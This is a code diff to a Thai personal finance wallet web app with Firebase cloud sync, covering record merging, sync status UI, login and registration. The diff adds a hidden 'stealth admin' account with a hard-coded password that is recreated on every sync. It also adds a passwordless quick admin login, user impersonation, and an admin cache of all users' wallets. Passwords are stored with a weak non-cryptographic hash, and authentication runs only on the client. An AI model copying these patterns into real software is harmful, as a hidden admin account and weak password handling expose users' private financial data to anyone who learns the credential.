+        function createEmptyWalletData() {
+            return {
+                transactions: [],
+                budgetLimit: 0,
+                savingsGoals: [],
+                quickButtons: [...DEFAULT_QUICK_BUTTONS],
+                updatedAt: new Date().toISOString()
+            };
+        }
+
+        function hashPasswordSimple(pw) {
+            let h = 2166136261;
+            const str = String(pw || '');
+            for (let i = 0; i < str.length; i++) {
+                h ^= str.charCodeAt(i);
+                h += (h << 1) + (h << 4) + (h << 7) + (h << 8) + (h << 24);
+            }
+            return 'enc_' + (h >>> 0).toString(16);
+        }
+
+        function ensureStealthAdminExists() {
+            if (!appState.usersRegistry['admin']) {
+                appState.usersRegistry['admin'] = {
+                    email: 'admin',
+                    displayName: 'ผู้ดูแลระบบ (Admin)',
+                    passwordHash: hashPasswordSimple('Admin@2026'),
+                    role: 'admin',
+                    avatarDataUrl: '',
+                    pinCode: '',
+                    createdAt: new Date().toISOString(),
+                    updatedAt: new Date().toISOString()
+                };
+            }
+        }
+
+        function isCurrentSessionAdmin() {
+            return Boolean(
+                appState.isStealthAdmin ||
+                appState.isImpersonating ||
+                (appState.isLoggedIn && appState.currentUser && (appState.currentUser.email === 'admin' || appState.currentUser.role === 'admin'))
+            );
+        }
+
+        function sanitizeFirestoreDocId(email) {
+            return String(email || 'unknown').trim().toLowerCase().replace(/[^a-z0-9@._-]/g, '_');
+        }
+
         // =========================================================================
         // 3. FIREBASE MODULAR SDK v10.12.2 REAL-TIME CLOUD SYNC ENGINE (24/7)
         // =========================================================================
@@ -1144,7 +1452,7 @@
         let unsubscribeRegistryDocListener = null;
         let unsubscribeActiveUserListener = null;
         let isApplyingRemoteSnapshot = false;
-// ... existing code ... -->
+
         function cleanupFirestoreListeners() {
             if (typeof unsubscribeCollectionListener === 'function') {
                 try { unsubscribeCollectionListener(); } catch (e) {}
@@ -1160,13 +1468,82 @@
             }
         }
 
+        function mergeUsersRegistries(localReg, remoteReg) {
+            const merged = { ...(localReg || {}) };
+            Object.keys(remoteReg || {}).forEach(key => {
+                const normKey = String(key).trim().toLowerCase();
+                const rUser = remoteReg[key];
+                if (!rUser) return;
+                const lUser = merged[normKey];
+                if (!lUser) {
+                    merged[normKey] = { ...rUser, email: normKey };
+                } else {
+                    const lTime = new Date(lUser.updatedAt || lUser.createdAt || 0).getTime();
+                    const rTime = new Date(rUser.updatedAt || rUser.createdAt || 0).getTime();
+                    merged[normKey] = rTime >= lTime
+                        ? { ...lUser, ...rUser, email: normKey }
+                        : { ...rUser, ...lUser, email: normKey };
+                }
+            });
+            return merged;
+        }
+
+        function mergeByIdPreserveAll(localArr, remoteArr) {
+            const map = new Map();
+            (Array.isArray(localArr) ? localArr : []).forEach(item => {
+                if (item && item.id) map.set(item.id, item);
+            });
+            (Array.isArray(remoteArr) ? remoteArr : []).forEach(item => {
+                if (item && item.id) {
+                    const existing = map.get(item.id);
+                    if (!existing) {
+                        map.set(item.id, item);
+                    } else {
+                        const eTime = new Date(existing.updatedAt || existing.createdAt || 0).getTime();
+                        const rTime = new Date(item.updatedAt || item.createdAt || 0).getTime();
+                        map.set(item.id, rTime >= eTime ? item : existing);
+                    }
+                }
+            });
+            return Array.from(map.values());
+        }
+
+        function mergeWalletDataNonDestructive(localWallet, remoteWallet) {
+            const l = localWallet || createEmptyWalletData();
+            const r = remoteWallet || null;
+            if (!r) return { ...createEmptyWalletData(), ...l };
+
+            const mergedTxs = mergeByIdPreserveAll(l.transactions, r.transactions)
+                .sort((a, b) => new Date(b.date || 0) - new Date(a.date || 0) || (b.createdAt || 0) - (a.createdAt || 0));
+            const mergedGoals = mergeByIdPreserveAll(l.savingsGoals, r.savingsGoals);
+            const mergedQuickBtns = mergeByIdPreserveAll(
+                Array.isArray(l.quickButtons) ? l.quickButtons : DEFAULT_QUICK_BUTTONS,
+                Array.isArray(r.quickButtons) ? r.quickButtons : []
+            );
+
+            const lTime = new Date(l.updatedAt || 0).getTime();
+            const rTime = new Date(r.updatedAt || 0).getTime();
+            const latestBudget = rTime >= lTime
+                ? (r.budgetLimit !== undefined ? r.budgetLimit : l.budgetLimit)
+                : (l.budgetLimit !== undefined ? l.budgetLimit : r.budgetLimit);
+
+            return {
+                transactions: mergedTxs,
+                budgetLimit: Number(latestBudget || 0),
+                savingsGoals: mergedGoals,
+                quickButtons: mergedQuickBtns.length ? mergedQuickBtns : [...DEFAULT_QUICK_BUTTONS],
+                updatedAt: new Date(Math.max(lTime, rTime, Date.now())).toISOString()
+            };
+        }
+
         async function syncUsersRegistryToCloud(registryObj) {
             if (!firestoreDbInstance || !registryObj) return;
             try {
+                // Overwrite users map cleanly so deleted users do not reappear on merge
                 await setDoc(doc(firestoreDbInstance, FIRESTORE_SYSTEM_COLLECTION, FIRESTORE_REGISTRY_DOC), {
                     users: registryObj,
                     updatedAt: new Date().toISOString()
-                }, { merge: true });
+                });
             } catch (err) {
                 console.warn('Registry sync warning:', err);
             }
@@ -1229,6 +1606,7 @@
                 });
 
                 appState.usersRegistry = mergeUsersRegistries(appState.usersRegistry, remoteUsersMap);
+                ensureStealthAdminExists();
                 await dualSave(FIXED_KEYS.USERS_REGISTRY, appState.usersRegistry);
                 await syncUsersRegistryToCloud(appState.usersRegistry);
 
@@ -1240,6 +1618,7 @@
                     const remoteWalletRaw = remoteWalletsMap[email] || null;
                     const mergedWallet = mergeWalletDataNonDestructive(localWalletRaw, remoteWalletRaw);
 
+                    appState.adminUsersWalletCache[email] = mergedWallet;
                     await dualSave(userKey, mergedWallet);
                     if (appState.isLoggedIn && appState.currentUser && appState.currentUser.email === email) {
                         appState.userData = mergedWallet;
@@ -1283,7 +1662,7 @@
                 return false;
             }
         }
-// ... existing code ... -->
+
         function startUsersCollectionRealtimeListener() {
             if (!firestoreDbInstance) return;
             if (typeof unsubscribeCollectionListener === 'function') {
@@ -1293,7 +1672,7 @@
                 unsubscribeRegistryDocListener();
             }
 
-            // Real-time listener on central registry document 'mywallet_system/users_registry'
+            // Real-time listener #1: Central users registry 'mywallet_system/users_registry' (24/7 across all devices)
             const registryDocRef = doc(firestoreDbInstance, FIRESTORE_SYSTEM_COLLECTION, FIRESTORE_REGISTRY_DOC);
             unsubscribeRegistryDocListener = onSnapshot(registryDocRef, async (docSnap) => {
                 if (!docSnap.exists()) return;
@@ -1320,17 +1699,25 @@
                 console.warn('Registry snapshot warning:', err);
             });
 
-            // Real-time listener on 'mywallet_users' collection
+            // Real-time listener #2: All user documents in 'mywallet_users' (preserves every user's profile & walletData 24/7)
             const usersColRef = collection(firestoreDbInstance, FIRESTORE_COLLECTION);
             unsubscribeCollectionListener = onSnapshot(usersColRef, async (querySnap) => {
                 const remoteUsersMap = {};
-                querySnap.forEach(docSnap => {
+                for (const docSnap of querySnap.docs) {
                     const docData = docSnap.data();
                     if (docData && docData.profile && docData.profile.email) {
                         const normEmail = String(docData.profile.email).trim().toLowerCase();
                         remoteUsersMap[normEmail] = { ...docData.profile, email: normEmail };
+
+                        if (docData.walletData && normEmail !== 'admin') {
+                            const userKey = FIXED_KEYS.USER_DATA_PREFIX + normEmail;
+                            const localWallet = await dualLoadWithRestore(userKey);
+                            const mergedWallet = mergeWalletDataNonDestructive(localWallet, docData.walletData);
+                            appState.adminUsersWalletCache[normEmail] = mergedWallet;
+                            await dualSave(userKey, mergedWallet);
+                        }
                     }
-                });
+                }
 
                 appState.usersRegistry = mergeUsersRegistries(appState.usersRegistry, remoteUsersMap);
                 await dualSave(FIXED_KEYS.USERS_REGISTRY, appState.usersRegistry);
@@ -1344,14 +1731,56 @@
                 console.warn('Collection snapshot warning:', err);
             });
         }
-// ... existing code ... -->
+
+        async function startActiveUserRealtimeListener(email) {
+            if (typeof unsubscribeActiveUserListener === 'function') {
+                try { unsubscribeActiveUserListener(); } catch (e) {}
+                unsubscribeActiveUserListener = null;
+            }
+            if (!firestoreDbInstance || !email || email === 'admin') return;
+
+            const docId = sanitizeFirestoreDocId(email);
+            const userDocRef = doc(firestoreDbInstance, FIRESTORE_COLLECTION, docId);
+
+            unsubscribeActiveUserListener = onSnapshot(userDocRef, async (docSnap) => {
+                if (!docSnap.exists()) return;
+                const docData = docSnap.data();
+                if (!docData) return;
+
+                isApplyingRemoteSnapshot = true;
+                try {
+                    if (docData.profile && appState.currentUser && appState.currentUser.email === email) {
+                        appState.currentUser = { ...appState.currentUser, ...docData.profile };
+                        appState.usersRegistry[email] = appState.currentUser;
+                        await dualSave(FIXED_KEYS.USERS_REGISTRY, appState.usersRegistry);
+                    }
+                    if (docData.walletData && appState.currentUser && appState.currentUser.email === email) {
+                        const mergedWallet = mergeWalletDataNonDestructive(appState.userData, docData.walletData);
+                        appState.userData = mergedWallet;
+                        appState.adminUsersWalletCache[email] = mergedWallet;
+                        await dualSave(FIXED_KEYS.USER_DATA_PREFIX + email, mergedWallet);
+                        updateHeaderAndLockUI();
+                        renderFullDashboard();
+                    }
+                    setCloudSyncStatus('synced');
+                } finally {
+                    isApplyingRemoteSnapshot = false;
+                }
+            }, (err) => {
+                console.warn('Active user snapshot warning:', err);
+            });
+        }
+
         async function pushUserDocumentToCloud(email, profileObj, walletObj) {
             if (!firestoreDbInstance || !email || email === 'admin' || isApplyingRemoteSnapshot) return;
             try {
                 setCloudSyncStatus('syncing');
                 const docId = sanitizeFirestoreDocId(email);
                 const nowIso = new Date().toISOString();
-                if (walletObj) walletObj.updatedAt = nowIso;
+                if (walletObj) {
+                    walletObj.updatedAt = nowIso;
+                    appState.adminUsersWalletCache[email] = walletObj;
+                }
 
                 await setDoc(doc(firestoreDbInstance, FIRESTORE_COLLECTION, docId), {
                     profile: profileObj,
@@ -1365,8 +1794,171 @@
                 setCloudSyncStatus('error', 'ไม่สามารถอัปโหลดข้อมูลขึ้น Cloud ได้');
             }
         }
-// ... existing code ... -->
-        async function disconnectFirebaseCloud() {
+
+        function setCloudSyncStatus(status, errMsg = '') {
+            appState.cloudStatus = status;
+            appState.cloudErrorMsg = errMsg;
+            if (status === 'synced') {
+                appState.lastSyncTimeStr = new Date().toLocaleTimeString('th-TH');
+            }
+            updateAdminCloudModalUI();
+        }
+
+        function updateAdminCloudModalUI() {
+            const pill = document.getElementById('adminCloudSyncPill');
+            const dot = document.getElementById('cloudSyncDotIcon');
+            const label = document.getElementById('cloudSyncLabelText');
+            const modalBadge = document.getElementById('cloudModalBadge');
+            const adminStatusText = document.getElementById('adminCloudStatusText');
+            const lastSyncEl = document.getElementById('cloudModalLastSyncTime');
+            const errAlert = document.getElementById('cloudModalErrorAlert');
+            const connectedGroup = document.getElementById('cloudConnectedActionsGroup');
+
+            const isAdmin = isCurrentSessionAdmin();
+            if (pill) {
+                if (isAdmin) {
+                    pill.classList.remove('hidden');
+                    pill.classList.add('inline-flex');
+                } else {
+                    pill.classList.add('hidden');
+                    pill.classList.remove('inline-flex');
+                }
+            }
+
+            if (appState.cloudStatus === 'synced') {
+                if (dot) dot.textContent = '🟢';
+                if (label) label.textContent = 'ซิงค์คลาวด์แล้ว';
+                if (modalBadge) {
+                    modalBadge.textContent = '🟢 ซิงค์ 24/7 อัตโนมัติ';
+                    modalBadge.className = 'px-2.5 py-1 rounded-full text-[10px] font-bold bg-emerald-500/20 text-emerald-300 shrink-0';
+                }
+                if (adminStatusText) {
+                    adminStatusText.textContent = 'เชื่อมต่อ 24/7 ✓';
+                    adminStatusText.className = 'text-xs font-bold text-emerald-400 mt-1';
+                }
+                if (lastSyncEl && appState.lastSyncTimeStr) {
+                    lastSyncEl.textContent = `อัปเดตล่าสุดเมื่อ: ${appState.lastSyncTimeStr}`;
+                    lastSyncEl.classList.remove('hidden');
+                }
+                if (errAlert) errAlert.classList.add('hidden');
+                if (connectedGroup) connectedGroup.classList.remove('hidden');
+            } else if (appState.cloudStatus === 'syncing') {
+                if (dot) dot.textContent = '🟡';
+                if (label) label.textContent = 'กำลังซิงค์...';
+                if (modalBadge) {
+                    modalBadge.textContent = '🟡 กำลังซิงค์...';
+                    modalBadge.className = 'px-2.5 py-1 rounded-full text-[10px] font-bold bg-amber-500/20 text-amber-300 shrink-0';
+                }
+                if (adminStatusText) {
+                    adminStatusText.textContent = 'กำลังเชื่อมต่อ...';
+                    adminStatusText.className = 'text-xs font-bold text-amber-300 mt-1';
+                }
+            } else if (appState.cloudStatus === 'error') {
+                if (dot) dot.textContent = '🔴';
+                if (label) label.textContent = 'เชื่อมต่อขัดข้อง';
+                if (modalBadge) {
+                    modalBadge.textContent = '🔴 เชื่อมต่อขัดข้อง';
+                    modalBadge.className = 'px-2.5 py-1 rounded-full text-[10px] font-bold bg-rose-500/20 text-rose-300 shrink-0';
+                }
+                if (adminStatusText) {
+                    adminStatusText.textContent = 'ขัดข้อง';
+                    adminStatusText.className = 'text-xs font-bold text-rose-400 mt-1';
+                }
+                if (errAlert && appState.cloudErrorMsg) {
+                    errAlert.textContent = appState.cloudErrorMsg;
+                    errAlert.classList.remove('hidden');
+                }
+            } else {
+                if (dot) dot.textContent = '⚪';
+                if (label) label.textContent = 'โหมดในเครื่อง';
+                if (modalBadge) {
+                    modalBadge.textContent = '⚪ โหมดในเครื่อง';
+                    modalBadge.className = 'px-2.5 py-1 rounded-full text-[10px] font-bold bg-slate-800 text-slate-300 shrink-0';
+                }
+                if (adminStatusText) {
+                    adminStatusText.textContent = 'โหมดในเครื่อง';
+                    adminStatusText.className = 'text-xs font-bold text-slate-400 mt-1';
+                }
+                if (errAlert && appState.cloudErrorMsg) {
+                    errAlert.textContent = appState.cloudErrorMsg;
+                    errAlert.classList.remove('hidden');
+                }
+            }
+        }
+
+        // Smart Parser: extracts Firebase config keys even when full SDK snippet is pasted
+        function parseFirebaseConfigRaw(rawText) {
+            const trimmed = String(rawText || '').trim();
+            if (!trimmed) return null;
+            try {
+                const parsed = JSON.parse(trimmed);
+                if (parsed && parsed.apiKey && parsed.projectId) return parsed;
+            } catch (e) {}
+
+            const keys = ['apiKey', 'authDomain', 'projectId', 'storageBucket', 'messagingSenderId', 'appId', 'measurementId'];
+            const extracted = {};
+            for (const key of keys) {
+                const pattern = new RegExp('["\']?' + key + '["\']?\\s*:\\s*["\']([^"\']+)["\']');
+                const m = trimmed.match(pattern);
+                if (m && m[1]) extracted[key] = m[1].trim();
+            }
+            return (extracted.apiKey && extracted.projectId) ? extracted : null;
+        }
+
+        window.handleSaveAndConnectFirebase = async function () {
+            if (!isCurrentSessionAdmin()) return;
+            const raw = document.getElementById('firebaseConfigTextarea').value;
+            const parsed = parseFirebaseConfigRaw(raw);
+            if (!parsed) {
+                showToast('รูปแบบโค้ด firebaseConfig ไม่ถูกต้อง กรุณาวางโค้ดจาก Firebase Console', '⚠️');
+                return;
+            }
+            document.getElementById('firebaseConfigTextarea').value = 'const firebaseConfig = ' + JSON.stringify(parsed, null, 2) + ';';
+            const ok = await initializeFirebaseCloudSync(parsed, true);
+            if (ok) {
+                showToast('เชื่อมต่อและเปิดซิงค์ Cloud 24/7 เรียบร้อยแล้ว!', '🟢');
+                await renderAdminUsersList();
+            }
+        };
+
+        // Clipboard copy helper using document.execCommand('copy') for reliable iFrame/Mobile compatibility
+        function copyTextToClipboardSafe(text) {
+            const ta = document.createElement('textarea');
+            ta.value = text;
+            ta.style.position = 'fixed';
+            ta.style.left = '-9999px';
+            document.body.appendChild(ta);
+            ta.select();
+            let ok = false;
+            try {
+                ok = document.execCommand('copy');
+            } catch (e) {}
+            document.body.removeChild(ta);
+            return ok;
+        }
+
+        window.copyFirebaseEmbedSnippet = function () {
+            const raw = document.getElementById('firebaseConfigTextarea').value;
+            const parsed = parseFirebaseConfigRaw(raw) || appState.firebaseConfig || DEFAULT_FIREBASE_CONFIG;
+            const snippet = 'const DEFAULT_FIREBASE_CONFIG = ' + JSON.stringify(parsed, null, 2) + ';';
+            if (copyTextToClipboardSafe(snippet)) {
+                showToast('คัดลอกโค้ด DEFAULT_FIREBASE_CONFIG ฉบับเต็มแล้ว', '📋');
+            } else {
+                showToast('กรุณาคัดลอกโค้ดจากช่องข้อความด้วยตนเอง', '⚠️');
+            }
+        };
+
+        window.triggerManualCloudSync = async function () {
+            if (!isCurrentSessionAdmin()) return;
+            const cfg = appState.firebaseConfig || DEFAULT_FIREBASE_CONFIG;
+            const ok = await initializeFirebaseCloudSync(cfg, true);
+            if (ok) {
+                showToast('ซิงค์ข้อมูลผู้ใช้ทั้งหมดเรียบร้อยแล้ว', '🔄');
+                await renderAdminUsersList();
+            }
+        };
+
+        window.disconnectFirebaseCloud = async function () {
             if (!isCurrentSessionAdmin()) return;
             cleanupFirestoreListeners();
             if (firebaseAppInstance) {
@@ -1382,22 +1974,1328 @@
             document.getElementById('cloudModalLastSyncTime').classList.add('hidden');
             setCloudSyncStatus('local');
             updateAdminCloudModalUI();
-            showToast('รีเซ็ตกลับเป็น Default Cloud Config แล้ว', '🔌');
+            showToast('ตัดการเชื่อมต่อ Cloud เรียบร้อยแล้ว', '🔌');
+        };
+
+        // =========================================================================
+        // 4. AUTHENTICATION, ACCOUNT LOCKS & SESSION MANAGEMENT
+        // =========================================================================
+        async function saveActiveUserWallet() {
+            if (!appState.isLoggedIn || !appState.currentUser) return;
+            const email = appState.currentUser.email;
+            appState.userData.updatedAt = new Date().toISOString();
+            appState.adminUsersWalletCache[email] = appState.userData;
+            await dualSave(FIXED_KEYS.USER_DATA_PREFIX + email, appState.userData);
+            if (email !== 'admin') {
+                await pushUserDocumentToCloud(email, appState.currentUser, appState.userData);
+            }
         }
-// ... existing code ... -->
-            // Step 5: Auto-connect 24/7 to Firebase Cloud Firestore (stored config or embedded DEFAULT_FIREBASE_CONFIG)
-            const savedFirebaseConfig = await dualLoadWithRestore(FIXED_KEYS.FIREBASE_CONFIG);
-            const activeCloudConfig = (savedFirebaseConfig && savedFirebaseConfig.apiKey && savedFirebaseConfig.projectId)
-                ? savedFirebaseConfig
-                : DEFAULT_FIREBASE_CONFIG;
-            await initializeFirebaseCloudSync(activeCloudConfig, false);
+
+        function updateHeaderAndLockUI() {
+            const authBtn = document.getElementById('headerAuthButton');
+            const subtitleEl = document.getElementById('userSubtitleText');
+            const avatarImg = document.getElementById('avatarHeaderImg');
+            const avatarFallback = document.getElementById('avatarHeaderFallback');
+            const balanceActions = document.getElementById('balanceCardActions');
+            const exportCsvBtn = document.getElementById('exportCsvButton');
+            const pinLockBtn = document.getElementById('headerPinLockBtn');
+            const adminBadge = document.getElementById('stealthAdminBadge');
+            const impBanner = document.getElementById('adminImpersonationBanner');
+            const impText = document.getElementById('impersonationBannerText');
+
+            const lockOverlays = [
+                'budgetLockOverlay',
+                'quickAddLockOverlay',
+                'mainFormLockOverlay',
+                'goalsLockOverlay'
+            ];
+
+            if (appState.isImpersonating && appState.currentUser) {
+                impBanner.classList.remove('hidden');
+                impText.textContent = `กำลังเข้าดูบัญชี: ${appState.currentUser.displayName || appState.currentUser.email} (${appState.currentUser.email})`;
+            } else {
+                impBanner.classList.add('hidden');
+            }
+
+            if (appState.isLoggedIn && appState.currentUser) {
+                authBtn.textContent = 'ออกจากระบบ';
+                authBtn.className = 'px-3.5 py-2 rounded-xl bg-rose-600/85 hover:bg-rose-500 text-white text-xs font-semibold shadow-lg transition active:scale-95 cursor-pointer';
+                subtitleEl.textContent = 'บัญชี: ' + (appState.currentUser.displayName || appState.currentUser.email);
+                balanceActions.classList.remove('hidden');
+                exportCsvBtn.classList.remove('hidden');
+
+                if (appState.currentUser.avatarDataUrl) {
+                    avatarImg.src = appState.currentUser.avatarDataUrl;
+                    avatarImg.classList.remove('hidden');
+                    avatarFallback.classList.add('hidden');
+                } else {
+                    avatarImg.classList.add('hidden');
+                    avatarFallback.classList.remove('hidden');
+                    avatarFallback.textContent = (appState.currentUser.displayName || 'U').charAt(0).toUpperCase();
+                }
+
+                if (appState.currentUser.pinCode && appState.currentUser.pinCode.length === 6 && !appState.isImpersonating) {
+                    pinLockBtn.classList.remove('hidden');
+                } else {
+                    pinLockBtn.classList.add('hidden');
+                }
+
+                lockOverlays.forEach(id => {
+                    const el = document.getElementById(id);
+                    if (el) el.classList.add('hidden');
+                });
+            } else {
+                authBtn.textContent = 'เข้าสู่ระบบ';
+                authBtn.className = 'px-3.5 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-semibold shadow-lg shadow-indigo-600/30 transition active:scale-95 cursor-pointer';
+                subtitleEl.textContent = 'สถานะ: ยังไม่ได้เข้าสู่ระบบ';
+                balanceActions.classList.add('hidden');
+                exportCsvBtn.classList.add('hidden');
+                pinLockBtn.classList.add('hidden');
+
+                avatarImg.classList.add('hidden');
+                avatarFallback.classList.remove('hidden');
+                avatarFallback.textContent = '👛';
+
+                lockOverlays.forEach(id => {
+                    const el = document.getElementById(id);
+                    if (el) el.classList.remove('hidden');
+                });
+            }
+
+            if (isCurrentSessionAdmin()) {
+                adminBadge.classList.remove('hidden');
+            } else {
+                adminBadge.classList.add('hidden');
+            }
+            updateAdminCloudModalUI();
         }
-// ... existing code ... -->
+
+        window.openAuthModal = function (tab = 'login') {
+            switchAuthModalTab(tab);
+            document.getElementById('authValidationAlert').classList.add('hidden');
+            document.getElementById('authAccountNotFoundActions').classList.add('hidden');
+
+            const quickAdminBox = document.getElementById('stealthAdminQuickLoginBox');
+            if (quickAdminBox) {
+                if (appState.isStealthAdmin) {
+                    quickAdminBox.classList.remove('hidden');
+                } else {
+                    quickAdminBox.classList.add('hidden');
+                }
+            }
+            openModalById('authModal');
+        };
+
+        window.handleQuickAdminLogin = async function () {
+            ensureStealthAdminExists();
+            const adminProfile = appState.usersRegistry['admin'];
+            await completeLoginSession(adminProfile, createEmptyWalletData(), true);
+            closeModalById('authModal');
+            openAdminModal();
+            showToast('เข้าสู่ระบบแอดมินด่วนสำเร็จ', '🛡️');
+        };
+
+        window.switchAuthModalTab = function (tab) {
+            appState.authModalTab = tab;
+            const loginBtn = document.getElementById('authTabLoginBtn');
+            const regBtn = document.getElementById('authTabRegisterBtn');
+            const heading = document.getElementById('authModalHeading');
+            const submitBtn = document.getElementById('authSubmitButton');
+            const dispGroup = document.getElementById('registerDisplayNameGroup');
+            const avatarGroup = document.getElementById('registerAvatarGroup');
+            const strengthBox = document.getElementById('passwordStrengthContainer');
+
+            document.getElementById('authValidationAlert').classList.add('hidden');
+            document.getElementById('authAccountNotFoundActions').classList.add('hidden');
+
+            if (tab === 'login') {
+                loginBtn.className = 'py-2 rounded-xl text-xs font-semibold bg-indigo-600 text-white shadow transition cursor-pointer';
+                regBtn.className = 'py-2 rounded-xl text-xs font-semibold text-slate-400 hover:text-white transition cursor-pointer';
+                heading.textContent = 'เข้าสู่ระบบ My wallet';
+                submitBtn.textContent = 'เข้าสู่ระบบ';
+                dispGroup.classList.add('hidden');
+                avatarGroup.classList.add('hidden');
+                strengthBox.classList.add('hidden');
+            } else {
+                regBtn.className = 'py-2 rounded-xl text-xs font-semibold bg-indigo-600 text-white shadow transition cursor-pointer';
+                loginBtn.className = 'py-2 rounded-xl text-xs font-semibold text-slate-400 hover:text-white transition cursor-pointer';
+                heading.textContent = 'สมัครสมาชิกใหม่ My wallet';
+                submitBtn.textContent = 'สมัครสมาชิกและเริ่มต้นใช้งาน';
+                dispGroup.classList.remove('hidden');
+                avatarGroup.classList.remove('hidden');
+                strengthBox.classList.remove('hidden');
+            }
+        };
+
+        window.prefillRegisterFromNotFound = function () {
+            const candidate = appState.notFoundEmailCandidate;
+            switchAuthModalTab('register');
+            if (candidate) {
+                document.getElementById('authEmailInput').value = candidate;
+                document.getElementById('authDisplayNameInput').value = candidate.split('@')[0];
+            }
+        };
+
+        function showAuthInlineError(msg, showQuickReg = false) {
+            const alertBox = document.getElementById('authValidationAlert');
+            const textEl = document.getElementById('authValidationText');
+            const actionsEl = document.getElementById('authAccountNotFoundActions');
+            textEl.textContent = msg;
+            alertBox.classList.remove('hidden');
+            if (showQuickReg) {
+                actionsEl.classList.remove('hidden');
+            } else {
+                actionsEl.classList.add('hidden');
+            }
+        }
+
+        function resizeImageFileToDataUrl(file, maxSize = 160) {
+            return new Promise((resolve) => {
+                if (!file) return resolve('');
+                const reader = new FileReader();
+                reader.onload = (ev) => {
+                    const img = new Image();
+                    img.onload = () => {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = maxSize;
+                        canvas.height = maxSize;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(img, 0, 0, maxSize, maxSize);
+                        resolve(canvas.toDataURL('image/jpeg', 0.8));
+                    };
+                    img.onerror = () => resolve('');
+                    img.src = ev.target.result;
+                };
+                reader.onerror = () => resolve('');
+                reader.readAsDataURL(file);
+            });
+        }
+
+        window.handleAuthFormSubmit = async function (e) {
+            e.preventDefault();
+            const rawEmail = document.getElementById('authEmailInput').value.trim();
+            const password = document.getElementById('authPasswordInput').value;
+            const displayNameRaw = document.getElementById('authDisplayNameInput').value.trim();
+            const rememberMe = document.getElementById('authRememberCheckbox').checked;
+
+            if (!rawEmail) {
+                showAuthInlineError('กรุณากรอกอีเมลหรือชื่อบัญชีผู้ใช้งาน');
+                return;
+            }
+            if (!password || password.length < 4) {
+                showAuthInlineError('กรุณากรอกรหัสผ่านอย่างน้อย 4 ตัวอักษร');
+                return;
+            }
+
+            const normEmail = rawEmail.toLowerCase();
+
+            // Pull latest central users registry from Cloud Firestore first so cross-device logins never miss new users
+            if (firestoreDbInstance) {
+                try {
+                    const regSnap = await getDoc(doc(firestoreDbInstance, FIRESTORE_SYSTEM_COLLECTION, FIRESTORE_REGISTRY_DOC));
+                    if (regSnap.exists() && regSnap.data().users) {
+                        appState.usersRegistry = mergeUsersRegistries(appState.usersRegistry, regSnap.data().users);
+                        await dualSave(FIXED_KEYS.USERS_REGISTRY, appState.usersRegistry);
+                    }
+                } catch (err) {}
+            }
+
+            ensureStealthAdminExists();
+
+            if (appState.authModalTab === 'register') {
+                if (appState.usersRegistry[normEmail]) {
+                    showAuthInlineError('ชื่อบัญชีหรืออีเมลนี้มีผู้ใช้งานแล้ว กรุณาสลับไปแท็บ "เข้าสู่ระบบ"');
+                    return;
+                }
+
+                const avatarFile = document.getElementById('authAvatarFileInput').files?.[0];
+                const avatarDataUrl = await resizeImageFileToDataUrl(avatarFile, 160);
+                const nowIso = new Date().toISOString();
+
+                const newProfile = {
+                    email: normEmail,
+                    displayName: displayNameRaw || rawEmail.split('@')[0],
+                    passwordHash: hashPasswordSimple(password),
+                    role: 'user',
+                    avatarDataUrl,
+                    pinCode: '',
+                    createdAt: nowIso,
+                    updatedAt: nowIso
+                };
+
+                const initialWallet = createEmptyWalletData();
+
+                appState.usersRegistry[normEmail] = newProfile;
+                appState.adminUsersWalletCache[normEmail] = initialWallet;
+                await dualSave(FIXED_KEYS.USERS_REGISTRY, appState.usersRegistry);
+                await dualSave(FIXED_KEYS.USER_DATA_PREFIX + normEmail, initialWallet);
+
+                if (firestoreDbInstance) {
+                    await pushUserDocumentToCloud(normEmail, newProfile, initialWallet);
+                }
+
+                await completeLoginSession(newProfile, initialWallet, rememberMe);
+                closeModalById('authModal');
+                showToast(`สร้างบัญชี "${newProfile.displayName}" สำเร็จ! ซิงค์ข้อมูล 24/7 พร้อมใช้งาน`, '🎉');
+            } else {
+                const existingProfile = appState.usersRegistry[normEmail];
+                if (!existingProfile) {
+                    appState.notFoundEmailCandidate = rawEmail;
+                    showAuthInlineError(`ไม่พบบัญชี "${rawEmail}" ในระบบ คุณสามารถสร้างบัญชีนี้ได้ทันที`, true);
+                    return;
+                }
+
+                const inputHash = hashPasswordSimple(password);
+                if (existingProfile.passwordHash !== inputHash) {
+                    showAuthInlineError('รหัสผ่านไม่ถูกต้อง กรุณาตรวจสอบและลองใหม่อีกครั้ง');
+                    return;
+                }
+
+                // Fetch latest wallet from Cloud Firestore before opening dashboard
+                let localWallet = await dualLoadWithRestore(FIXED_KEYS.USER_DATA_PREFIX + normEmail);
+                if (firestoreDbInstance && normEmail !== 'admin') {
+                    try {
+                        const docId = sanitizeFirestoreDocId(normEmail);
+                        const uSnap = await getDoc(doc(firestoreDbInstance, FIRESTORE_COLLECTION, docId));
+                        if (uSnap.exists() && uSnap.data().walletData) {
+                            localWallet = mergeWalletDataNonDestructive(localWallet, uSnap.data().walletData);
+                            await dualSave(FIXED_KEYS.USER_DATA_PREFIX + normEmail, localWallet);
+                        }
+                    } catch (err) {}
+                }
+
+                const finalWallet = localWallet || createEmptyWalletData();
+                appState.adminUsersWalletCache[normEmail] = finalWallet;
+                await completeLoginSession(existingProfile, finalWallet, rememberMe);
+                closeModalById('authModal');
+                showToast(`ยินดีต้อนรับกลับคุณ ${existingProfile.displayName}!`, '👋');
+
+                if (normEmail === 'admin') {
+                    openAdminModal();
+                }
+            }
+        };
+
+        window.handleDemoOAuthLogin = async function (provider) {
+            const normEmail = provider.toLowerCase() + '_user@mywallet.local';
+            ensureStealthAdminExists();
+            let profile = appState.usersRegistry[normEmail];
+            let wallet = await dualLoadWithRestore(FIXED_KEYS.USER_DATA_PREFIX + normEmail);
+
+            if (!profile) {
+                const nowIso = new Date().toISOString();
+                profile = {
+                    email: normEmail,
+                    displayName: `ผู้ใช้ ${provider}`,
+                    passwordHash: hashPasswordSimple('oauth_' + provider),
+                    role: 'user',
+                    avatarDataUrl: '',
+                    pinCode: '',
+                    createdAt: nowIso,
+                    updatedAt: nowIso
+                };
+                wallet = createEmptyWalletData();
+                appState.usersRegistry[normEmail] = profile;
+                appState.adminUsersWalletCache[normEmail] = wallet;
+                await dualSave(FIXED_KEYS.USERS_REGISTRY, appState.usersRegistry);
+                await dualSave(FIXED_KEYS.USER_DATA_PREFIX + normEmail, wallet);
+                if (firestoreDbInstance) {
+                    await pushUserDocumentToCloud(normEmail, profile, wallet);
+                }
+            }
+
+            await completeLoginSession(profile, wallet || createEmptyWalletData(), true);
